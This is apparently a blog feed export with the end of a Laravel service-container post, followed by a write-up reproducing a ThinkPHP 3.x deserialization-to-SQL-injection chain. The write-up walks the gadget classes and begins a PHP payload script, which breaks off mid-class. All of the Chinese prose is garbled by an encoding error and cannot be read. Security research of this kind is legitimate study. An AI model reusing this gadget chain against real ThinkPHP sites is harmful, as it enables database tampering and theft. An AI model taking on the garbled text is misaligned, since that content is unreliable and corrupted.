æœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿå¯èƒ½è¿™æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼å§ã€‚ã€‚è¿˜æ²¡æ€ä¹ˆäº†è§£ã€‚ã€‚ã€‚Laravel ä¹‹åçš„ä»£ç ä¸­ä¹Ÿç¡®å®é€šè¿‡ç±»ä¼¼ä¸‹é¢çš„æ–¹å¼è¿›è¡Œäº†è°ƒç”¨ã€‚ä¸ªäººè®¤ä¸ºè¿™æ ·å­ç›¸å½“äºä¸ºæœåŠ¡ç±»æ–°å¢å¤šä¸€ä¸ªå•ç‹¬çš„æ–¹æ³•å§ã€‚å¯ä»¥è¿™æ ·å­è°ƒç”¨:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Container</span>-&gt;bindings[ServiceA::class](<span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ›´å¤šé«˜çº§ç‚¹çš„çŸ¥è¯†å‚è€ƒä¸‹è¿™ç¯‡æ–‡ç« </p><p><a href="https://www.cnblogs.com/echojson/p/10957362.html">https://www.cnblogs.com/echojson/p/10957362.html</a></p><br><h1 id="åœ¨-Laravel-ä¸­çš„ç›¸å…³æ“ä½œ"><a href="#åœ¨-Laravel-ä¸­çš„ç›¸å…³æ“ä½œ" class="headerlink" title="åœ¨ Laravel ä¸­çš„ç›¸å…³æ“ä½œ"></a>åœ¨ Laravel ä¸­çš„ç›¸å…³æ“ä½œ</h1><p><em>Laravel</em> ä¸­ï¼Œæœ‰ä¸ªå« <em>Container</em> çš„ç±»ï¼Œç”¨äºå­˜æ”¾å„ä¸ªå®ä¾‹åŒ–çš„ç±»ï¼Œæ–¹ä¾¿éšæ—¶è°ƒç”¨ã€‚</p><h2 id="æ³¨å†Œ"><a href="#æ³¨å†Œ" class="headerlink" title="æ³¨å†Œ"></a>æ³¨å†Œ</h2><p>ä¸ºäº†å°†å„ä¸ªç±»æ³¨å†Œè¿› <em>Container</em> ä¸­ï¼Œ<em>Container</em>ç±»æœ‰ä¸€ä¸ªåä¸º <em>bind</em> çš„æ–¹æ³•ä¸“é—¨ç”¨äºå°†å®ä¾‹åŒ–çš„ç±»å­˜å…¥ <em>bindings</em> æˆå‘˜å˜é‡ä¸­ã€‚è¿™äº›å®ä¾‹åŒ–çš„ç±»æœ‰å¾ˆå¤šéƒ½æ˜¯å¸¦ç€åŒ¿åå‡½æ•°çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * é€šè¿‡ Container æ³¨å†Œä¸€ä¸ª binding</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string  $abstract</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  \Closure|string|null  $concrete</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  bool  $shared</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params"><span class="variable">$abstract</span>, <span class="variable">$concrete</span> = <span class="literal">null</span>, <span class="variable">$shared</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//å¦‚æœä¼ è¿›æ¥çš„å®ä¾‹ä¸æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°</span></span><br><span class="line">    <span class="comment">//å°†ä¼šé€šè¿‡ $this-&gt;getClosure</span></span><br><span class="line">    <span class="comment">//å¼ºè¡Œç»™å®ä¾‹æ·»åŠ ä¸€ä¸ªåŒ¿åå‡½æ•°</span></span><br><span class="line">    <span class="comment">//ä¸è¿‡ç”±äºæ·»åŠ åŒ¿åå‡½æ•°æ—¶ï¼Œ$this æ˜¯ Container ç±»</span></span><br><span class="line">    <span class="comment">//æ‰€ä»¥éœ€è¦ç»™ getClosure() ä¼ å…¥ $concreteã€‚ç¡®ä¿åŸæ¥çš„ç±»å®ä¾‹å­˜åœ¨</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$concrete</span> <span class="keyword">instanceof</span> <span class="built_in">Closure</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (! is_string(<span class="variable">$concrete</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">TypeError</span>(<span class="built_in">self</span>::class.<span class="string">&#x27;::bind(): Argument #2 ($concrete) must be of type Closure|string|null&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//!!!!</span></span><br><span class="line">        <span class="variable">$concrete</span> = <span class="keyword">$this</span>-&gt;getClosure(<span class="variable">$abstract</span>, <span class="variable">$concrete</span>);</span><br><span class="line">        <span class="comment">//!!!!</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//æ³¨å†Œå®ä¾‹</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>] = compact(<span class="string">&#x27;concrete&#x27;</span>, <span class="string">&#x27;shared&#x27;</span>);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="è°ƒç”¨"><a href="#è°ƒç”¨" class="headerlink" title="è°ƒç”¨"></a>è°ƒç”¨</h2><p>è°ƒç”¨å·²æ³¨å†Œçš„ <em>binding</em>  ä½¿ç”¨çš„æ˜¯ <em>Container</em>ç±» çš„ <em>build()</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">build</span>(<span class="params"><span class="variable">$concrete</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//å¦‚æœä¼ å…¥çš„å®ä¾‹æ˜¯åŒ¿åå‡½æ•°</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$concrete</span> <span class="keyword">instanceof</span> <span class="built_in">Closure</span>) &#123;</span><br><span class="line">        <span class="comment">//ç›´æ¥ä½¿ç”¨ å˜é‡() çš„æ–¹å¼è¿›è¡Œè°ƒç”¨</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$concrete</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;getLastParameterOverride());</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;br&gt;

&lt;p&gt;åœ¨ç¿»çœ‹ Laravel æºç æ—¶ï¼Œå‘ç°å…¶è¿›è¡ŒæœåŠ¡æ³¨å†Œçš„æ—¶å€™ï¼Œå¤§é‡ä½¿ç”¨äº†è¯¸å¦‚è¿™æ ·çš„æ ¼å¼:&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="http://example.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>tp3.x sqlæ³¨å…¥å¤ç°</title>
    <link href="http://example.com/2021/03/01/2021-02-28-tp3-x-sql/"/>
    <id>http://example.com/2021/03/01/2021-02-28-tp3-x-sql/</id>
    <published>2021-03-01T15:41:00.000Z</published>
    <updated>2021-04-23T05:57:20.805Z</updated>
    
    <content type="html"><![CDATA[<p>Referenceï¼š</p><p><a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p><span id="more"></span><br><h2 id="ååºåˆ—åŒ–èµ·ç‚¹"><a href="#ååºåˆ—åŒ–èµ·ç‚¹" class="headerlink" title="ååºåˆ—åŒ–èµ·ç‚¹"></a>ååºåˆ—åŒ–èµ·ç‚¹</h2><p><strong>ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</strong></p><p>line 636 - line 642</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;img) || <span class="keyword">$this</span>-&gt;img-&gt;destroy();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>åœ¨ååºåˆ—åŒ–ä¸­ï¼Œæ‰€æœ‰æˆå‘˜å±æ€§å‡å¯æ§ã€‚å³ <code>$this-&gt;img</code> å¯æ§ã€‚</p><p>å¦‚æ­¤ä¸€æ¥ï¼Œå³å¯ <strong>æ— å‚æ•°å¼</strong> è°ƒç”¨ TP ä¸‹ä»»æ„ç±»çš„ <em>destroy</em> æ–¹æ³•</p><br><h2 id="destroy-è·³æ¿"><a href="#destroy-è·³æ¿" class="headerlink" title="destroy()  è·³æ¿"></a>destroy()  è·³æ¿</h2><p>æœç´¢ destroy æ–¹æ³•ï¼Œæ‰¾åˆ°ä¸‰ä¸ªå­˜åœ¨ destroy çš„ä½ç½®ï¼š</p><img src="/2021/03/01/2021-02-28-tp3-x-sql/1.png" style="width:500px;"><p>å…¶ä¸­ä¸¤ä¸ªç±» <code>Think\Session\Driver\Mysqli</code>ç±» å’Œ <code>Think\Session\Driver\Db</code>ç±»  æ˜¯ç›´æ¥è°ƒç”¨ <em>mysqli_query</em> è¿›è¡Œæ•°æ®åº“æ“ä½œçš„ï¼Œå¦‚ä¸‹ï¼š</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"><span class="variable">$sessID</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$hander</span> = is_array(<span class="keyword">$this</span>-&gt;hander) ? <span class="keyword">$this</span>-&gt;hander[<span class="number">0</span>] : <span class="keyword">$this</span>-&gt;hander;</span><br><span class="line">    mysqli_query(<span class="variable">$hander</span>, <span class="string">&quot;DELETE FROM &quot;</span> . <span class="keyword">$this</span>-&gt;sessionTable . <span class="string">&quot; WHERE session_id = &#x27;<span class="subst">$sessID</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mysqli_affected_rows(<span class="variable">$hander</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>ç”±äº <em>mysqli_query</em> ä¸­ <code>$hander</code> çš„å€¼å–å†³ä¸ <code>$this-&gt;hander</code>ï¼Œä½†æ˜¯å°±ç®—æˆ‘ä»¬åœ¨åºåˆ—åŒ– POC ä¸­è¿›è¡Œ <em>mysqli_connect</em> ï¼Œå¥æŸ„ç§»æ¤ä¹‹åæ˜¯ä¸å¯ç”¨çš„ï¼Œæ‰€ä»¥è¿™ä¸ªç‚¹åªèƒ½æ”¾å¼ƒã€‚</p><br><p>è¿™é‡Œæ³¨æ„ä¸‹ï¼Œ php7 è°ƒç”¨æœ‰å‚æ•°å‡½æ•°æ—¶å¿…é¡»ä¼ å‚ï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚ä½† php5 åˆ™å¯ä¸ä¼ å‚æ•°è°ƒç”¨æœ‰å‚æ•°å‡½æ•°ã€‚</p><br><p>è½¬å¤´çœ‹ç¬¬ä¸‰ä¸ªç±» <code>Think\Session\Driver\Memcache</code> </p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"><span class="variable">$sessID</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handle-&gt;delete(<span class="keyword">$this</span>-&gt;sessionName . <span class="variable">$sessID</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>ç”±äº <code>$this-&gt;handle</code> å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ <em>delete</em> æ–¹æ³•ã€‚</p><p>å¹¶ä¸”ç”±äºè·³åˆ° <em>destroy</em> æ–¹æ³•æ—¶æ˜¯ <strong>æ— å‚æ•°è°ƒç”¨</strong>ã€‚è¿™é‡Œçš„ <em>$sessID</em> æ˜¯ä¸ªæ— æ•ˆçš„å½¢å‚ã€‚ç”¨è¿™ä¸ªæ— æ•ˆçš„å½¢å‚å»è°ƒç”¨åˆ«çš„å‡½æ•°æ—¶ï¼Œä¼ å…¥çš„å‚æ•°ä¼šæ— æ•ˆã€‚æ‰€ä»¥è¿™é‡Œè°ƒç”¨ <em>delete</em> çš„å½¢å‚è¿˜æ˜¯ä¸å¯æ§çš„</p><br><h2 id="Model-delete-è·³æ¿"><a href="#Model-delete-è·³æ¿" class="headerlink" title="Model delete() è·³æ¿"></a>Model delete() è·³æ¿</h2><p>å…¨å±€æœç´¢ <code>function delete</code>ã€‚æ‰¾åˆ° <code>Think\Model</code> ç±»</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pk</span> = <span class="keyword">$this</span>-&gt;getPk();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$options</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœåˆ é™¤æ¡ä»¶ä¸ºç©º åˆ™åˆ é™¤å½“å‰æ•°æ®å¯¹è±¡æ‰€å¯¹åº”çš„è®°å½•</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$pk</span>])) &#123;</span><br><span class="line">            <span class="comment">//!</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;delete(<span class="keyword">$this</span>-&gt;data[<span class="variable">$pk</span>]);</span><br><span class="line">            <span class="comment">//!</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="comment">// åˆ†æè¡¨è¾¾å¼</span></span><br><span class="line">    <span class="variable">$options</span> = <span class="keyword">$this</span>-&gt;_parseOptions();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœæ¡ä»¶ä¸ºç©º ä¸è¿›è¡Œåˆ é™¤æ“ä½œ é™¤éè®¾ç½® 1=1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">......    </span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;db-&gt;delete(<span class="variable">$options</span>);</span><br><span class="line"> ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><code>$this-&gt;getPK()</code>å‡½æ•°ä»…ä»…åªæ˜¯ <code>return $this-&gt;pk;</code></p><p>æ‰€ä»¥ <em>$pk</em> çš„å€¼ä¸º <em>$this-&gt;pk</em></p><br><p>å¯ä»¥å‘ç°åœ¨ <code>if</code> åˆ¤æ–­ä¸­ï¼Œå¦‚æœä¼ å…¥çš„ <em>$options</em> ä¸ºç©ºï¼Œåˆ™é‡æ–°è°ƒç”¨ <code>$this-&gt;delete()</code> æ–¹æ³• ï¼Œå¹¶ä¸”ä¼ å…¥çš„å‚æ•°ä¸º <code>$this-&gt;data[$pk]</code>ã€‚è¿™æ ·å­ *delete()*æ–¹æ³•çš„å½¢å‚ <em>$options</em> å°±æ˜¯å¯æ§çš„äº†ã€‚</p><br><p>åœ¨<em>åˆ†æè¡¨è¾¾å¼</em> æµç¨‹ä¸­ï¼Œé‡æ–°ä¸º <em>$options</em> èµ‹å€¼ï¼Œè°ƒç”¨äº† <code>$this-&gt;_parseOptions()</code>ã€‚è¯¥æ–¹æ³•å°†ä¼šè¿”å› <code>$this-&gt;options</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$options</span>)) &#123;</span><br><span class="line">        <span class="variable">$options</span> = array_merge(<span class="keyword">$this</span>-&gt;options, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$options</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><em>åˆ†æè¡¨è¾¾å¼</em> æµç¨‹åè¿˜åˆ¤æ–­äº† <em>$options[â€˜whereâ€™]</em> ã€‚éœ€è¦ç¡®ä¿ <em>$options</em> ä¸­æœ‰è¯¥å€¼</p><br><p>ç¨‹åºæ¥ç€è°ƒç”¨äº† <code>$this-&gt;db-&gt;delete($options)</code>ï¼Œå…¶ä¸­ <em>$this-&gt;db</em> å¯æ§ï¼Œå¹¶ä¸” <em>$options</em> å¯æ§ï¼Œå…¨å±€æœç´¢ <code>function delete</code>ã€‚æ‰¾åˆ° <em>Think\Db\Driver</em> ç±»ã€‚</p><p>è‡³äºé€‰æ‹©è¿™ä¸ªç±»çš„åŸå› ï¼Œå› ä¸ºå®ƒåœ¨åé¢æ„é€  <em>SQL payload</em> çš„æ—¶å€™æ¯”è¾ƒæ–¹ä¾¿ã€‚</p><h2 id="Driver-delete-è·³æ¿"><a href="#Driver-delete-è·³æ¿" class="headerlink" title="Driver delete() è·³æ¿"></a>Driver delete() è·³æ¿</h2><br><p><em>Think\Db\Driver</em> ç±» <em>delete()</em> æ–¹æ³•ä¸»è¦ä»£ç å¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$table</span> = <span class="keyword">$this</span>-&gt;parseTable(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>   = <span class="string">&#x27;DELETE FROM &#x27;</span> . <span class="variable">$table</span>;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute(<span class="variable">$sql</span>, !<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><br><p>å¯æ˜¯è¯¥ç±»ä¸ºæŠ½è±¡ç±»ï¼Œæ— æ³•ç›´æ¥å®ä¾‹åŒ–ã€‚éœ€è¦æ‰¾ä¸€ä¸ªç»§æ‰¿å®ƒçš„å­ç±»ï¼Œå¹¶ä¸”è¯¥ç±»æ²¡æœ‰ *delete()*ï¼Œè¿™æ ·ç¨‹åºè°ƒç”¨çš„æ—¶å€™æ‰èƒ½è°ƒç”¨åˆ°çˆ¶ç±»çš„ <em>delete()</em> æ–¹æ³•ã€‚</p><p>æœ€ç»ˆæ‰¾åˆ° <em>Think\Db\Driver\Mysql</em>ç±» ä½œä¸ºååºåˆ—åŒ–çš„å®ä¾‹åŒ–ç±»ã€‚</p><br><p><code>delete()</code>æ–¹æ³• æœ€ç»ˆè°ƒç”¨äº† <code>$this-&gt;execute()</code>ï¼Œç”±äºæ­¤ç±»æ˜¯ä¸“é—¨ç”¨ä½œæ•°æ®åº“æ“ä½œçš„ï¼Œ<code>execute()</code> ä¸­å¹¶æ²¡æœ‰å‘ç°èƒ½ RCE çš„ç‚¹ï¼Œä¹Ÿæ²¡æœ‰å‘ç°èƒ½å½“è·³æ¿çš„ç‚¹ã€‚</p><p>ä¸è¿‡æ³¨æ„åˆ° <code>execute()</code> çš„ç¬¬ä¸€è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;initConnect(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><br><p>è·Ÿè¿›ï¼Œå‘ç°å½“ä¸å­˜åœ¨ <em>$this-&gt;_linkID</em> æ—¶ï¼Œå°†ä¼šè°ƒç”¨ <em>$this-&gt;connect()</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_linkID) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_linkID = <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>è·Ÿè¿›ï¼Œå‘ç°è¯¥å‡½æ•°ä½¿ç”¨ <em>PDO</em> è¿›è¡Œæ•°æ®åº“è¿æ¥ï¼Œå¹¶è¿”å›äº†å¥æŸ„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$config</span>)) &#123;</span><br><span class="line">        <span class="variable">$config</span> = <span class="keyword">$this</span>-&gt;config;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>] = <span class="keyword">new</span> PDO(<span class="variable">$config</span>[<span class="string">&#x27;dsn&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>], <span class="keyword">$this</span>-&gt;options);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;linkID[<span class="variable">$linkNum</span>];</span><br></pre></td></tr></table></figure><br><p>è¿”å›å¥æŸ„åï¼Œ<code>execute</code>æ–¹æ³• å°†ä¼šæ ¹æ® <strong>ä¼ å…¥çš„ sqlè¯­å¥</strong> æ‰§è¡Œsqlã€‚è¿™é‡Œ <strong>ä¼ å…¥çš„sqlè¯­å¥</strong> å°±æ˜¯ <code>delete()</code>æ–¹æ³• ä¸­çš„ <code>$sql</code></p><br><h2 id="åŸºæœ¬Payload"><a href="#åŸºæœ¬Payload" class="headerlink" title="åŸºæœ¬Payload"></a>åŸºæœ¬Payload</h2><p>è‡³æ­¤ï¼Œä»¥ä¸Šæ•´ä¸ªä»ååºåˆ—åŒ–åˆ°æ‰§è¡ŒSQLæ³¨å…¥çš„æµç¨‹ã€‚æ ¹æ®ä»¥ä¸Šæµç¨‹ï¼Œå¾—å‡ºåŸºæœ¬Payload:</p><p><strong>Payload demo:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¬ä¸‰ä¸ªè·³æ¿ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯æœ€ç»ˆæ‰§è¡Œç±»</span></span><br><span class="line"><span class="comment">//ç”±äºæ‰§è¡Œç±» Db æ˜¯æŠ½è±¡ç±»ï¼Œæ— æ³•å®ä¾‹åŒ–</span></span><br><span class="line"><span class="comment">//é‚ä½¿ç”¨å…¶å­ç±» Mysqlè¿›è¡Œå®ä¾‹åŒ–</span></span><br><span class="line"><span class="comment">//ç”±äº payload éœ€è¦è°ƒç”¨çˆ¶ç±»çš„ delete()</span></span><br><span class="line"><span class="comment">//å­ç±»å¿…é¡»æ²¡æœ‰ delete() æ–¹æ³•</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Mysql</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//ç¬¬äºŒä¸ªè·³æ¿ <span class="title">Model</span>-&gt;<span class="title">delete</span>()</span><br><span class="line"><span class="title">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">protected $pk = &#x27;exp&#x27;;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 